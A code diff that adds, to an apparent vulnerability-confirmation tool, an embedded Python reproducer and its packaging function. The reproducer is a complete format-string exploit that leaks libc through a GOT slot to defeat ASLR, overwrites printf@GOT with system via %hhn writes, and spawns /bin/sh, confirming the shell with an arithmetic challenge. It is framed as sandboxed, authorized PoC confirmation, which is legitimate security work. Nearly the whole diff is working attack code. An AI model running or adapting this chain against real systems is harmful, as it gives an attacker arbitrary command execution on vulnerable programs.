@@ -1537,6 +1537,93 @@ def magic_replay(mode: str, argv, flag_names, meta: dict,
             {"replay_magic.py": _MAGIC_REPLAY, "magic.json": json.dumps(spec, indent=1).encode()})
 
 
+_FORMAT_GOT_REPLAY = b'''#!/usr/bin/env python3
+"""Replay a format-string -> GOT-overwrite -> shell, and say whether it reproduced.
+
+A printf(user) sink over a looping target: leak a libc pointer out of a GOT slot with a
+positional %s (base = leaked - the slot symbol's offset), %hhn-overwrite printf@GOT with system,
+then hand the loop "/bin/sh" so its next printf(buf) runs system("/bin/sh"). The libc base is
+per-run (ASLR), so no static input exists -- this re-does every step live, building the same
+payloads the confirmation did with the bundled fmt.py. Proof is a shell answering an arithmetic
+challenge. Exit 0 = reproduced. RUN IN A SANDBOX/VM -- runs an untrusted binary. Authorized use."""
+import json
+import os
+import random
+import select
+import subprocess
+import sys
+import time
+
+here = os.path.dirname(os.path.abspath(__file__))
+sys.path.insert(0, here)
+import fmt                                               # the exact payload builders used to confirm
+
+spec = json.load(open(os.path.join(here, "format_got.json")))
+exe = sys.argv[1] if len(sys.argv) > 1 else "./target.bin"
+WORD = int(spec.get("word", 8))
+timeout = float(spec.get("timeout", 8))
+
+
+def read_until(p, deadline, quiet=0.3):
+    out, last = b"", time.time()
+    while time.time() < deadline:
+        r, _, _ = select.select([p.stdout], [], [], 0.1)
+        if r:
+            c = os.read(p.stdout.fileno(), 4096)
+            if not c: break
+            out, last = out + c, time.time()
+        elif p.poll() is not None: break
+        elif out and time.time() - last > quiet: break
+    return out
+
+
+for _ in range(3):
+    p = subprocess.Popen([exe] + list(spec.get("argv") or []), stdin=subprocess.PIPE,
+                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=here)
+    read_until(p, time.time() + 0.5)
+    try:
+        p.stdin.write(fmt.probe_payload(count=30, word=WORD)); p.stdin.flush()
+        arg_off = fmt.find_fmt_offset(read_until(p, time.time() + timeout / 3), word=WORD)
+        if not arg_off: p.kill(); continue
+        p.stdin.write(fmt.read_at_payload(arg_off, spec["leak_got"], word=WORD)); p.stdin.flush()
+        raw = read_until(p, time.time() + timeout / 3)[:6]
+        if len(raw) < 6: p.kill(); continue
+        base = int.from_bytes(raw.ljust(8, b"\\0"), "little") - spec["leak_off"]
+        if base <= 0 or base & 0xFFF: p.kill(); continue
+        wp = fmt.fmtstr_payload(arg_off, {spec["printf_got"]: base + spec["system_off"]}, word=WORD)
+        if not wp: p.kill(); continue
+        p.stdin.write(wp + b"\\n"); p.stdin.flush(); read_until(p, time.time() + timeout / 3)
+        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+        p.stdin.write(b"/bin/sh\\x00\\n"); p.stdin.flush(); time.sleep(0.3)
+        p.stdin.write(b"echo LYKOS_SHELL_$((%d*%d))\\n" % (a, b)); p.stdin.flush()
+    except (BrokenPipeError, OSError):
+        p.kill(); continue
+    out = read_until(p, time.time() + timeout, quiet=1.5)
+    if (b"LYKOS_SHELL_%d" % (a * b)) in out:
+        sys.stdout.write(out.decode("latin-1", "ignore"))
+        print("\\n[+] printf@GOT overwritten with system, shell evaluated the challenge"); sys.exit(0)
+    p.kill()
+print("[-] format-string GOT overwrite did not confirm"); sys.exit(1)
+'''
+
+
+def format_got_replay(argv, printf_got, system_off, leak_got, leak_off, meta,
+                      word: int = 8, timeout: float = 8.0) -> tuple[str, dict]:
+    """(run_cmd, extra_files) for a format-string GOT-overwrite shell; sets meta's verdict and
+    ships fmt.py so the reproducer builds the identical %hhn payloads. The bundle used to ship a
+    dummy `#!/bin/sh` comment as input.bin, which did nothing."""
+    meta["verdict"] = {"exit": "zero", "script": "runner.sh",
+                       "note": "runner.sh re-leaks libc, overwrites printf@GOT with system and "
+                               "exits 0 printing [+] when the spawned shell evaluates a challenge"}
+    spec = {"argv": [str(a) for a in argv or []], "printf_got": int(printf_got),
+            "system_off": int(system_off), "leak_got": int(leak_got), "leak_off": int(leak_off),
+            "word": int(word), "timeout": timeout}
+    fmt_src = pathlib.Path(__file__).with_name("fmt.py").read_bytes()
+    return ("python3 ./replay_format_got.py ./target.bin",
+            {"replay_format_got.py": _FORMAT_GOT_REPLAY, "fmt.py": fmt_src,
+             "format_got.json": json.dumps(spec, indent=1).encode()})
+
+
 def build_secret(target_bytes: bytes, secrets: list, meta: dict) -> bytes:
     """Bundle a hard-coded-secret PoC: the binary, the extracted secret(s), and a pure-stdlib
     offline re-extractor that proves the credential is embedded (no target execution).
